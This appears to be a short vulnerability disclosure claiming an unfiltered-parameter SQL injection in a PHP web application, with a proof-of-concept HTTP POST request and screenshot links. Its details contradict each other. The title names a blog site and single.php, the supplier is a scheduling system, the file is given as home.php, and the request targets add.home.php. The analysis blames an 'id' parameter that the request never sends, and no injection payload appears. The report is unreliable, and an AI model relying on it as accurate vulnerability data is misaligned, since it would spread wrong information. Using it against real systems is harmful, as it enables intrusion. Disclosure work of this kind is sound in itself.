# Responsive Blog Site has sql injection in single.php

## supplier 
https://code-projects.org/simple-scheduling-system-in-php-with-source-code/
## Vulnerability file
home.php

## describe

**Code analysis**   

In the home.php file of Responsive Blog Site, the id parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/9e2e0730-f653-4356-8a64-38c28a4b0421.png)


## POC

```
POST /sche/schedulingsystem/add.home.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 132
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/sche/schedulingsystem/home.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ndcsgs6flhkd0mjf99bi0qqcoh
Connection: close

faculty=Engineering&course=Computer+Science&subject=Computer+Programming+1&room=SB14&start_time=5%3A30+pm&end_time=7%3A30+pm&insert=

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/67384e99-60c9-4d6f-b49b-55618b307ebd.png)
Get databases
![image-2025](https://github.com/asd1238525/cve/blob/main/03e2537e-9185-40f7-8dc9-09e4e462d58c.png)